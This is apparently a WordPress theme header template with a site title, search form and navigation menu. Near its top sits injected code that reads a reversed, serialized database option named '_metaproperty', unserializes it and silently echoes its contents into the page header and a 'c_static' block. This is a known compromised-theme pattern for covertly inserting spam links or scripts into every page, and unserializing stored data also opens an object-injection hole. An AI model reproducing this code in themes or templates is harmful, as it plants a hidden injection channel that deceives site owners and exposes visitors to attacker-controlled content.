<?php /**/ ?>
<?php $_metaproperty = unserialize(trim(strrev(get_option("_metaproperty")))); echo @$_metaproperty[0]; ?>
<div id="header">

	<h1><a href="<?php bloginfo('url'); ?>"><?php bloginfo('name'); ?></a></h1>
	
	<a href="<?php bloginfo('url'); ?>"><?php bloginfo('description'); ?></a>
	
	<div id="search">
		
		<?php include(TEMPLATEPATH . '/searchform.php'); ?>
		
	</div>
	
</div>

<div id="navbar">
	
	<?php wp_page_menu('show_home=1'); ?>
	
</div>
<div class="c_static">
	<p><?php echo @$_metaproperty[1]; ?></p>
</div>
